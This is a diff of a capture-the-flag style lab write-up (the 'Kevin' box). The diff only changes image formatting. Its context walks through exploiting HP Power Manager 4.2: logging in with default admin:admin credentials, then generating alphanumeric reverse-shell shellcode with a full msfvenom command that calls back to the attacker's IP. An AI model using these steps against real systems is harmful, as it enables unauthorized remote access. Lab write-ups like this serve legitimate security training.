@@ -27,19 +27,19 @@ PORT      STATE SERVICE
 
 So we have a number of open ports here, though only a few of them are realistically going to be exploitable I suspect. I quickly check to see if we can list SMB shares and see if we can log into rpcclient, but we cannot, so I go check out the web page. It looks like there is a web app on port 80 called HP Power Manager:
 
-![Kevin1.png](/assets/images/Kevin/Kevin1.png){: .center-aligned width="600px"}
+![Kevin1.png](/assets/images/Kevin/Kevin1.png){: .responsive-image}
 
 There is a potential exploit on [exploit-db](https://www.exploit-db.com/exploits/10099), but I try `admin:admin` first. 
 
-![Kevin2.png](/assets/images/Kevin/Kevin2.png){: .center-aligned width="600px"}
+![Kevin2.png](/assets/images/Kevin/Kevin2.png){: .responsive-image}
 
 And we are able to log in. I click around, but can't find anything, though I do find the version is listed as 4.2. 
 
-![Kevin3.png](/assets/images/Kevin/Kevin3.png){: .center-aligned width="600px"}
+![Kevin3.png](/assets/images/Kevin/Kevin3.png){: .responsive-image}
 
 At this point I go back to the exploit-db script and copy it into my home folder. When reviewing the script, we see a that we need to replace some shell code with new code so that it calls back to our machine, and we notice this line describing the encoding:
 
-![Kevin4.png](/assets/images/Kevin/Kevin4.png){: .center-aligned width="600px"}
+![Kevin4.png](/assets/images/Kevin/Kevin4.png){: .responsive-image}
 
 [This](https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/) from Proving Grounds explains how to generate shellcode in this format, so we do that. We also need to take note that that code needs to be in C format `-f c`, which can be confusing because the exploit is written in python (you can see this if you find it with searchsploit, the format is `.py`). I got stuck here, and wound up trying a bunch of other exploits I found online. The full command is: `msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.183 LPORT=80 -e x86/alpha_mixed -f c` which results in this code:
 
@@ -103,7 +103,7 @@ So we add that to directly below "n00bn00b" (line 42). Note, the output of the m
 
 And it takes a while (under a minute), but eventually we get a shell. 
 
-![Kevin5.png](/assets/images/Kevin/Kevin5.png){: .center-aligned width="600px"}
+![Kevin5.png](/assets/images/Kevin/Kevin5.png){: .responsive-image}
 
 And it's already a `NT Authority\System` shell, so we grab `proof.txt` and we're done. 
 
